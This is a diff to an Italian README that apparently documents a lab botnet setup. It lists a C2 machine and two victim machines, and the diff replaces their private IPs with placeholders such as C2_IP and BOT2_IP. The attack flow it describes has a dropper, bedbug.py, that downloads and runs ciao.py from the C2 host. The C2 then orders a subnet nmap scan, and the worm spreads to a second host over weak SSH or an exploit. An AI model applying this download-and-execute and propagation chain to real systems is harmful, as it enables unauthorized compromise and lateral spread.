@@ -4,9 +4,9 @@
 
 | Ruolo | Machine | IP | Script |
 |-------|---------|-----|--------|
-| sergio | cs20 | 192.168.1.21 | `sergio.py` |
+| sergio | cs20 | C2_IP | `sergio.py` |
 | Vittima 1 / Seed | cs33 | 192.168.1.x | `bedbug.py` + `ciao.py` |
-| Vittima 2 | cs23 (default - Arch Linux CT) | 192.168.1.104 | `bedbug.py` + `ciao.py` |
+| Vittima 2 | cs23 (default - Arch Linux CT) | BOT2_IP | `bedbug.py` + `ciao.py` |
 
 ## Script
 
@@ -22,7 +22,7 @@
 
 ```
 [1] cs33: python3 bedbug.py (eseguito manualmente)
-[2] bedbug.py scarica ciao.py da http://192.168.1.21:8081/ciao.py
+[2] bedbug.py scarica ciao.py da http://C2_IP:8081/ciao.py
 [3] bedbug.py esegue: python3 ciao.py
 ```
 
@@ -38,8 +38,8 @@
 ### Fase 3 - Propagazione a cs23
 
 ```
-[6] cs20 invia comando a cs33: "nmap -sV 192.168.1.0/24"
-[7] cs33 scopre cs23 a 192.168.1.223
+[6] cs20 invia comando a cs33: "nmap -sV LOCAL_SUBNET"
+[7] cs33 scopre cs23 a BOT2_IP
     vettore di accesso (SSH debole / exploit / altro):
       -> cs23 scarica bedbug.py da http://192.168.1.x:9090/bedbug.py
       -> cs23 esegue bedbug.py
